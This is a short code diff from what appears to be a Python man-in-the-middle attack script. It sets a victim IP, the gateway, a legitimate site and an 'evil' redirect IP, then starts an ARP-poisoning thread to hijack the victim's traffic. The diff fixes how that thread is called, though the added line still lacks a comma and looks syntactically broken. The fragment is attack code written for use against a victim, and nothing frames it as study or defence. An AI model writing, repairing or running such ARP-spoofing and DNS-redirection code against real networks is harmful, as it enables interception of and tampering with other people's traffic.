@@ -52,7 +52,7 @@ def main() :
     ipServer = '192.168.178.1' # The IP address of the gateway
     goodSite = 'google.com' # The website we want to redirect them from
     evilSite = '188.114.96.0' # The IP address we want to redirect the victim to
-    arpThread = Thread(target.ArpPoison.MIMspoofARP(ipVictim, ipServer), daemon=True)
+    arpThread = Thread(target=ArpPoison.MIMspoofARP, args=(ipVictim, ipServer) daemon=True)
     arpThread.start()
     while True: 
         try:
